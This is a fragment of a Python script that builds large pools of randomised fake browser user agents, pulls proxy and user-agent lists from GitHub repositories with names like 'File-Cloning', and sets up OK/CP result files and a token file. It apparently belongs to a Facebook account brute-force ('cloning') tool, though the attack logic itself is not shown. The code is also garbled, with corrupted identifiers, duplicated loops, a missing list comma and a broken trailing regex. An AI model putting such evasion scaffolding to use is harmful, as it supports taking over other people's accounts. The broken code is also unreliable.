  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",

  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",

  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",

  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",

  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",

  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",

  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",

  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",

  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",

  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",

  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",

  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",

  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",

  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",

  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",

  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",

  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",

  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",

  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",

  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",

  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",

  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",

  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",

  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",

  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",

  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",

  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",

  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",

  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",

  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",

  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",

  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",

  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",

  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",

  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",

  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",

  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",

  "Dalvik/2.1.0 (Linux; U; Android 5.1)",

  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"

  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",

  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",

  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",

  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",

  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",

  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",

  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",

  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",

  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",

  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",

  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",

  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 
  
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MR-AKASH786/File-Cloning/blob/main/Approved.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safarhsvehsvsi/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=randomdhbdsb.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open https://facebook.com/groups/430144089559219/')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('https://t.me/AKASH_ON_FIRE_99')
logo ="""
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
😓😓\033[1;32m●▬▬▬▬▬๑۩[i love youAKASH]۩๑▬▬▬▬▬▬●\033[1;32m😓😓
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
        \33[0;91m 



 \033[1;32m█████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
\033[1;32m██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
\033[1;32m███████║█████╔╝ ███████║███████╗███████║
\033[1;32m██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
\033[1;32m██║  ██║██║  ██╗██║  ██║███████║██║  ██║
\033[1;32m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                         
                                        
                                        

╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
💔💔\033[1;32m●▬▬▬▬▬๑۩[i love youAKASH]۩๑▬▬▬▬▬▬●\033[1;32m💔💔
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
"(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
